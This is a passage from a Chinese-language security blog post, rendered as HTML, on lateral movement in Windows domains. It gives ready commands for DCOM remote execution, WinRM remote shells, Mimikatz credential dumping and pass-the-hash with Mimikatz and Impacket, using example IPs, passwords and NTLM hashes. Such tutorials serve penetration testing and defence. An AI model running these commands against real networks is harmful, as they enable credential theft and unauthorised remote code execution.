+ [Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.52.138&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c C:\shell.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3><span id="excelapplication">Excel.Application</span></h3><pre class="line-numbers language-none"><code class="language-none"># 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例:
+ $com &#x3D; [activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.168.52.138&quot;))
+ $com.DisplayAlerts &#x3D; $false
+ 
+ # 然后执行如下命令，我们就可以调用该对象的&quot;DDEInitiate&quot;方法在远程主机上启动进程:
+ $com.DDEInitiate(&quot;cmd.exe&quot;,&quot;&#x2F;c C:\shell.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3><span id="shellbrowserwindow">ShellBrowserWindow</span></h3>使用条件：适用于Windows 10和Windows Server 2012 R2等版本的系统。<pre class="line-numbers language-none"><code class="language-none"># 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例:
+ $com &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.52.138&quot;))
+ 
+ # 然后执行如下命令，我们就可以调用该对象的&quot;shellExecute&quot;方法在远程主机上启动进程:
+ $com.Document.Application.shellExecute(&quot;C:\shell.exe&quot;)
+ 
+ # 完整的命令:
+ [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.52.138&quot;)).Document.Application.shellExecute(&quot;C:\shell.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3><span id="impacket里的dcomexecpy脚本">Impacket里的dcomexec.py脚本</span></h3>Impacket 里面提供的 dcomexec.py 脚本可以提供一个类似于 wmiexec.py 脚本的半交互式shell，但使用的是DCOM，目前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。<br>命令格式如下：<pre class="line-numbers language-none"><code class="language-none">.&#x2F;dcomexec.py domain&#x2F;username:password@ip
+ .&#x2F;dcomexec.py domain&#x2F;username:password@ip &lt;command&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ul>
+<h2><span id="winrm">WinRM</span></h2><p>执行命令<br>交互式会话<br>WinRM是通过执行WS-Management协议（用于远程软件和硬件管理的Web服务协议）来实现远程管理的，允许处于一个共同网络内的Windows计算机彼此之间互相访问和交换信息，对应的端口是5985。在一台计算机启用WinRM服务后，防火墙会自动放行其相关通信端口，在另一台计算机便能通过WinRM对其进行远程管理了。<br>只有在Windows Server 2008以上版本的服务器中，WinRm服务才会自动启动。<br>在利用WinRM进行横向移动时，需要拥有远程主机的管理员凭据信息。</p>
+<h3><span id="通过winrm执行远程命令">通过WinRM执行远程命令</span></h3><p>Windows远程管理提供了两个工具：<br>① Winrs，允许远程执行命令的命令行工具，利用了WS-Manage协议<br>② Winrm（Winrm.cmd)，内置系统管理命令行工具，允许管理员配置本机的WinRM服务。<br>在默认情况下，无法通过WinRM连接到目标系统。可能出现错误：Winrs error：WinRM客户端无法处理该请求。可以将默认身份验证与IP地址结合使用：<br>① 传输为HTTPS或目标位于TrustedHosts列表中，并且提供显式凭据<br>② 使用Winrm.cmd配置TrustedHosts。<br>执行以下命令，将目标地址添加到TrustedHosts中：</p>
+<pre class="line-numbers language-none"><code class="language-none">winrm set winrm&#x2F;config&#x2F;client @&#123;TrustedHosts&#x3D;&quot;192.168.30.100&quot;&#125;
+
+set-Item WSMan:localhost\client\trustedhosts -value *    # 通过powershell，信任所有主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>Winrs</strong><br>winrs是Windows上远程管理提供的客户端程序，允许通过提供的用户凭据，在运行WinRM的服务器上执行命令。要求通信双方都安装了WinRM服务。</p>
+<pre class="line-numbers language-none"><code class="language-none"># 执行系统命令
+winrs -r:http:&#x2F;&#x2F;192.168.30.100:5985 -u:Administrator -p:Admin2012 &quot;whoami&quot;
+
+# 获取远程交互式命令行
+winrs -r:http:&#x2F;&#x2F;192.168.30.100:5985 -u:Administrator -p:Admin2012 &quot;cmd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>Winrm.cmd</strong><br>winrm.cmd允许WMI对象通过WinRm传输进行远程交互，在本地或远程计算机上枚举WMI对象实例或调用WMI类方法。比如可以通过调用Win32_Process类的Create方法来创建远程实例。</p>
+<pre class="line-numbers language-none"><code class="language-none">winrm invoke create wmicimv2&#x2F;win32_process -SkipCAcheck -skipCNcheck @&#123;commandline&#x3D;&quot;notepad.exe&quot;&#125; -r:http:&#x2F;&#x2F;192.168.30.100:5985 -u:Administrator -p:Admin2012<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="evil-winrm">Evil-Winrm</span></h3><p><a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
+<h2><span id="pth哈希传递">PTH哈希传递</span></h2><p>利用Mimikatz进行PTH<br>Mimikatz内置了哈希传递的功能，需要本地管理员权限。<br>① 抓取用户的哈希</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>② 利用抓取的域管理员的NTLM hash进行哈希传递</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:hackme.com &#x2F;ntlm:93b95aef15f4d50fab96ffc44a2f326a&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>利用impacket进行PTH</strong><br>Impacket项目中具有远程执行功能的几个脚本几乎都可以进行哈希传递攻击，常见的有：</p>
+<pre class="line-numbers language-none"><code class="language-none">psexec.py      # 类似PSEXEC的功能示例，使用remcomsvc（https:&#x2F;&#x2F;github.com&#x2F;kavika13&#x2F;remcom）
+smbexec.py     # 与使用remcomsvc的psexec w&#x2F;o类似的方法。这里描述了该技术。我们的实现更进一步，实例化本地smbserver以接收命令的输出。这在目标计算机没有可写共享可用的情况下很有用。
+atexec.py      # 此示例通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。
+wmiexec.py     # 通过Windows Management Instrumentation使用的半交互式shell，它不需要在目标服务器上安装任何服务&#x2F;代理，以管理员身份运行，非常隐蔽。
+dcomexec.py    # 类似于wmiexec.py的半交互式shell，但使用不同的DCOM端点。目前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用法：</p>
+<pre class="line-numbers language-none"><code class="language-none"># 普通用法
+python3 xxx.py domain&#x2F;user:password@ip
+
+# 哈希传递
+python3 xxx.py domain&#x2F;user@ip -hashes :93b95aef15f4d50fab96ffc44a2f326a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">网络共享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">文件传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">执行程序或命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">系统服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">RDP远程桌面协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">PsExec远程管理工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">WMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">DCOM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.1.</span> <span class="toc-text">MMC20.Application</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.2.</span> <span class="toc-text">ShellWindows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.3.</span> <span class="toc-text">Excel.Application</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.4.</span> <span class="toc-text">ShellBrowserWindow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.5.</span> <span class="toc-text">Impacket里的dcomexec.py脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.1.</span> <span class="toc-text">通过WinRM执行远程命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.2.</span> <span class="toc-text">Evil-Winrm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">PTH哈希传递</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&text=内网横向移动"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&is_video=false&description=内网横向移动"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网横向移动&body=Check out this article: https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&name=内网横向移动&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&t=内网横向移动"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    killeveee
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
